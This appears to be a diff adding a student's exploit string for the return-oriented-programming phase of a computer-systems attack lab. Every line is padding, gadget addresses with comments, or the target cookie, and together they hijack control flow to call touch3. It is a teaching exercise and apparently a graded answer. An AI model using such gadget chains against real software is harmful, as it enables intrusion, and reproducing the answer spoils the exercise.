@@ -1,0 +1,18 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+17 1c 40 00 00 00 00 00 /*addval_107 movq rsp, rax*/
+88 1b 40 00 00 00 00 00 /*setval_411 movq rax, rdi*/
+b4 1b 40 00 00 00 00 00 /*addval_338 pop  rax     */
+48 00 00 00 00 00 00 00 /*offset 72               */
+75 1c 40 00 00 00 00 00 /*getval_214 movl eax, ecx*/
+82 1c 40 00 00 00 00 00 /*getval_493 movl ecx, edx might need cor*/
+5b 1c 40 00 00 00 00 00 /*getval_288 movl edx, esi*/
+bf 1b 40 00 00 00 00 00 /*add_xy*/
+88 1b 40 00 00 00 00 00 /*setval_411 movq rax, rdi*/
+45 1a 40 00 00 00 00 00 /*touch3*/
+37 34 35 36 38 39 61 30 /*cookie*/
+
+
